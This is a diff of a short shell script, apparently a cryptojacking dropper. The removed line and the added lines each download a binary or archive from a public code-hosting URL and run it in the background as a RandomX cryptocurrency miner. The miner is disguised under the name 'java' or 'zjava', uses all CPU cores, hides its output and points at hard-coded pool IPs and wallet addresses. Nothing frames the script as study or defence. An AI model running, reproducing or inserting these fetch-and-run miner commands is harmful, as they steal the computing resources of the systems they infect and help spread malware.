@@ -1,1 +1,2 @@
-wget -qO java https://bitbucket.org/retrasaz/stunning-fortnight/raw/f6e481231e73a191e74b5c887e7aa693b47b68f1/rubby && chmod +x java && nohup ./java -o 45.115.224.184:8080 -a rx/0 -u TuskeMdRB1oXu4rQmSRzjMc96LoSUhGa9NERnWfpVfm23wqfq3YbWZ6NY6KumYQEGJSduhGYzV4RYZhxFzd1Yo51TP9vnw4TUfU4z.yui --randomx-1gb-pages -p -x -t $(nproc --all)
+wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
+nohup ./zjava -a rx/0 -o 8.222.134.27:80 -u SaLvsAXvo1HSCeA3Fq12dAjVoPb9pVkPSHntdWbLRnRWSxsU9jJW6Kv9mqE3Q1mKXiGMa1MCaD76NFdSrzfzLdvJJjDphKEpADT.$(echo $(shuf -i 1-9 -n 1)-tahu ponk) --randomx-1gb-pages -p -x -t $(nproc --all) &>/dev/null &
